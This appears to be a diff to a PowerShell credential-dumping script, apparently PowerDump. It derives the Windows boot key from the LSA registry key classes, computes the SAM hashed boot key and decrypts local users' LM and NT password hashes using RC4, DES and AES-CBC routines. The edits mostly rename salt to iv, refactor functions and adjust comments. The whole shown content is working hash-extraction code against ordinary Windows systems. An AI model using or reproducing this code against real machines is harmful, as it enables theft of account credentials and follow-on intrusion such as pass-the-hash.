@@ -1,4 +1,5 @@
-[CmdletBinding()]param()
+[CmdletBinding()]param() 
+# $DebugPreference = # -Debug
 
 $PowerDump = $null
 
@@ -126,12 +127,9 @@ function LoadApi{
 
 
 function Get-BootKey{
-    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | ForEach-Object{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
+    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | ForEach-Object {Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
     $bootkey = New-Object byte[] $($s.Length/2);
     0..$($bootkey.Length-1) | ForEach-Object{$bootkey[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
-    # $b2 = New-Object byte[] 16;
-    # 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
-    # return ,$b2;
     $p = @(0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7)
     $scrambledBootkey = [byte[]]::new(0)
     foreach ($i in 0..($bootkey.Length - 1)) {
@@ -141,6 +139,7 @@ function Get-BootKey{
     return $scrambledBootkey
 }
 
+
 function Get-HBootKey{
     param([byte[]]$bootkey);
     $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
@@ -149,9 +148,9 @@ function Get-HBootKey{
     $k = Get-Item HKLM:\SAM\SAM\Domains\Account; #SAM Reg
     if (!($k)) {return $null}
     [byte[]]$F = $k.GetValue("F");
-    if (-!($F)) {return $null}
+    if (!($F)) {return $null}
 
-    $revision = [byte[]]$F[0x00..0x01] | Select -First 1
+    $revision = [byte[]]$F[0x00..0x01] | Select-Object -First 1
     Write-Debug "hbootkey_revision:$revision"
 
     switch ($revision) {
@@ -224,9 +223,9 @@ function NewRC4([byte[]]$key)
     } -PassThru
 }
 
-function des_encrypt {param([byte[]]$data, [byte[]]$key) return ,(des_transform $data $key $true) }
+# function des_encrypt {param([byte[]]$data, [byte[]]$key) return ,(des_transform $data $key $true) } #enc
 
-function des_decrypt {param([byte[]]$data, [byte[]]$key) return ,(des_transform $data $key $false) }
+function des_decrypt {param([byte[]]$data, [byte[]]$key) return ,(des_transform $data $key $false) } #dec
 
 function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt) { 
     $des = new-object Security.Cryptography.DESCryptoServiceProvider; 
@@ -234,8 +233,8 @@ function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt) {
     $des.Padding = [Security.Cryptography.PaddingMode]::None; 
     $des.Key = $key; 
     $des.IV = $key; 
-    if ($doEncrypt -eq $true) { return ,($des.CreateEncryptor().TransformFinalBlock($data, 0, $data.Length)); } 
-    else { return ,($des.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)); } 
+    if ($doEncrypt -eq $true) { return ,($des.CreateEncryptor().TransformFinalBlock($data, 0, $data.Length)); }  #enc
+    else { return ,($des.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)); }  #dec
 }
 
 function Get-RegKeyClass([string]$key, [string]$subkey){
@@ -249,27 +248,21 @@ function Get-RegKeyClass([string]$key, [string]$subkey){
             throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
         }
     }
-    $KEYQUERYVALUE = 0x1;
     $KEYREAD = 0x19;
-    $KEYALLACCESS = 0x3F;
     $result = "";
     [int]$hkey=0
-    if (!($script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey)))
-    {
+    if (!($script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))){
     	$classVal = New-Object Text.Stringbuilder 1024
     	[int]$len = 1024
-    	if (!($script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0)))
-    	{
+    	if (!($script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))){
     		$result = $classVal.ToString()
     	}
-    	else
-    	{
+    	else{
     		Write-Error "RegQueryInfoKey failed";
     	}
     	$script:PowerDump::RegCloseKey($hkey) > $null
     }
-    else
-    {
+    else{
     	Write-Error "Cannot open key";
     }
     return $result;
@@ -287,20 +280,20 @@ function Get-UserKeys{
 
 
 function DecryptHashes { 
-    param($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey,[byte[]]$salt)
+    param($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey,[byte[]]$iv)
     [byte[]]$lmHash = $emptyLm; [byte[]]$ntHash=$emptyNt; 
     # LM Hash 
     if ($enc_lm_hash) { 
-        switch ($salt) {
+        switch ($iv) {
             $null {$lmHash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;}
-            Default {$lmHash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword $salt;}
+            Default {$lmHash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword $iv;}
         }
     }
     # NT Hash
     if($enc_nt_hash){
-        switch ($salt) {
+        switch ($iv) {
             $null {$ntHash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;}
-            Default {$ntHash = DecryptSingleSaltedHash $rid $hbootkey $enc_nt_hash $antpassword $salt;}
+            Default {$ntHash = DecryptSingleHashCBC $rid $hbootkey $enc_nt_hash $antpassword $iv;}
         }  
     }
     return ,($lmHash,$ntHash)
@@ -324,17 +317,17 @@ function DecryptSingleHash {
     return ,$hash
 }
 
-function DecryptSingleSaltedHash{
-    param($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr,[byte[]]$nt_salt)
+function DecryptSingleHashCBC{
+    param($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr,[byte[]]$iv)
 
-    $desKeys = sid_to_key $rid
+    $desKeys = sid_to_key $rid #get des Keys
 
     $cipher = [System.Security.Cryptography.Aes]::Create()
     $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $cipher.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $cipher.BlockSize = 128
     $cipher.Key = $hbootkey
-    $cipher.IV = $nt_salt
+    $cipher.IV = $iv
     $decryptor = $cipher.CreateDecryptor()
     $obfkey = [byte[]]::new($enc_hash.Length)
     $obfkey = $decryptor.TransformFinalBlock($enc_hash, 0, $enc_hash.Length)
@@ -383,9 +376,9 @@ function Get-UserHashes{
     # check if hashes exist (if byte memory equals to 20, then we've got a hash)
     $LM_exists = $false;
     $NT_exists = $false;
-    # LM header check
-    $isLm = $u.V[$(0x9c+4)..$(0x9c+8)][0]
-    $isNt = $u.V[$(0x9c+16)..$(0x9c+20)][0]
+    # NT,LM header check
+    $isLm = $u.V[$(0x9c+4)] # $isLm = $u.V[$(0x9c+4)..$(0x9c+8)][0]
+    $isNt = $u.V[$(0x9c+16)] # $isNt = $u.V[$(0x9c+16)..$(0x9c+20)][0] #0xAC,0xB0
 
     # LM header check
     if (($isLm -eq 20) -or ($isLm -eq 56)){
@@ -398,11 +391,11 @@ function Get-UserHashes{
 
     $hash_offset = $u.HashOffset
     $lm_offset_bytes = $u.V[0x9c..0x9f]
-    $nt_offset_bytes = $u.V[$(0x9c+12)..$(0x9c+15)]
+    $nt_offset_bytes = $u.V[$(0x9c+12)..$(0x9c+15)] #0xA8,0xAB
     $lm_offset = [BitConverter]::ToUInt32($lm_offset_bytes, 0) + 204
     $nt_offset = [BitConverter]::ToUInt32($nt_offset_bytes, 0) + 204
     
-    Write-Debug "isLm: $LM_exists,isNt: $NT_exists"
+    Write-Debug "isLm($isLM): $LM_exists,isNt($isNT): $NT_exists"
     Write-Debug "hash_offset: $hash_offset"
     Write-Debug "lm_offset_bytes: $lm_offset_bytes"
     Write-Debug "nt_offset_bytes: $nt_offset_bytes"
@@ -411,40 +404,40 @@ function Get-UserHashes{
 
     # LM
     if ($LM_exists -eq $true){
-        $salt = $null
+        $iv = $null
         switch ($u.V[$($lm_offset+2)..$($lm_offset+3)][0]) { #Lm Revision
             1 {
                 $enc_lm_hash = $u.V[$($lm_hash_offset+20)..$($lm_hash_offset+52)];
             }
-            2 { $salt = $u.V[$($lm_hash_offset+4)..$($lm_hash_offset+20)];
+            2 { $iv = $u.V[$($lm_hash_offset+4)..$($lm_hash_offset+20)];
                 $enc_lm_hash = $u.V[$($lm_hash_offset+20)..$($lm_hash_offset+52)];
             }
             default {}
         }
-        Write-Debug "lm_salt:$salt"
+        Write-Debug "lm_iv:$iv"
         Write-Debug "enc_lm_hash:$enc_lm_hash"
     }
 
     #NT
     if ($NT_exists -eq $true){
         # $nt_salt = $null
-        $salt = $null
+        $iv = $null
 
         switch ($u.V[$($nt_offset+2)..$($nt_offset+3)][0]) { #Nt Revision
             1 {
                 $enc_nt_hash = [byte[]]$u.V[$($nt_offset+4)..$($nt_offset+20)]
             }
             2 {
-                $salt = [byte[]]$u.V[$($nt_offset+8)..$($nt_offset+(24-1))]
+                $iv = [byte[]]$u.V[$($nt_offset+8)..$($nt_offset+(24-1))]
                 $enc_nt_hash = [byte[]]$u.V[$($nt_offset+24)..$($nt_offset+(56-1))]
             }
             Default {Write-Error "nt_revision"}
         }
-        Write-Debug "nt_salt:$salt"
+        Write-Debug "nt_iv:$iv"
         Write-Debug "enc_nt_hash:$enc_nt_hash"
     }
 
-    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $salt);
+    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $iv);
     
 }
 
